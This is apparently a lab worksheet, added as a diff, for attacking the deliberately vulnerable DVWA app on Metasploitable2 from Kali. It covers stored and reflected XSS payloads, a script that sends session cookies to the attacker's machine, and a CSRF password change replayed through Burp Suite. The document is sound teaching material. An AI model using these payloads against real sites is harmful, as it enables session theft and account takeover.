@@ -1,0 +1,47 @@
+SETUP
+
+Start Kali Linux and Metasploitable2 VM.
+Open browser in Kali and enter:
+http://<Metasploitable_IP>
+Open DVWA → Login
+Username: admin
+Password: password
+
+PART A – XSS (Cross Site Scripting)
+
+STORED XSS
+
+Go to DVWA → XSS (Stored).
+Enter:
+Name: Test
+Message: <b>Hello Everyone</b>
+Click Sign Guestbook.
+Enter script: <script>alert("Hello This is XSS")</script>
+Refresh page → popup alert appears.
+Fetch cookies: <script>alert(document.cookie)</script>
+
+REFLECTED XSS
+
+Go to XSS (Reflected).
+Enter: <script>alert("hello")</script>
+Click Submit → popup appears.
+
+STEAL COOKIES
+
+In XSS Stored enter: <script>new Image().src="http://<Kali_IP>/abc.php?output="+document.cookie;</script>
+Start listener in Kali terminal.
+Refresh DVWA page → cookies sent to Kali machine.
+
+PART B – CSRF (Cross Site Request Forgery)
+
+Login DVWA as admin.
+Set DVWA Security Level → LOW.
+Open Burp Suite → Enable Proxy Intercept.
+Go to DVWA → CSRF page.
+Enter new password and click Change.
+Capture request in Burp Suite.
+Send captured request to Repeater.
+Forward request → Password successfully changed.
+Modify password again in Repeater and send.
+Disable proxy intercept and logout from DVWA.
+Try login using old password → login fails.
